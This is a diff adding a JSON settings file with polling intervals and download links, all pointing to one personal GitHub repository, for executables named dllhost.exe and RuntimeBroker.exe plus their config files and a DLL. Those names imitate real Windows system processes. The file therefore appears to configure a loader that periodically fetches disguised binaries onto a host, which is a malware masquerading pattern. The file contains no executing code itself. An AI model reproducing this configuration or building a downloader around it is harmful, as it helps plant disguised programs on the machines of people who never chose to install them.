@@ -1,1 +1,23 @@
-
+{
+  "settings": {
+    "logLevel": 6,
+    "ConfirmationLog": true
+  },
+  "intervals": {
+    "Confirmation": 1200000,
+    "CallService": 480000
+  },
+  "links": {
+    "dllhostFiles": [
+      "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/dllhost.exe",
+      "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/dllhost.exe.config",
+      "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/Newtonsoft.Json.dll"
+    ],
+    "runtimebrokerFiles": [
+      "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/RuntimeBroker.exe",
+      "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/RuntimeBroker.exe.config"
+    ],
+    "dllhostConfig": "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/dllhost.exe.config",
+    "runtimebrokerConfig": "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/RuntimeBroker.exe.config"
+  }
+}
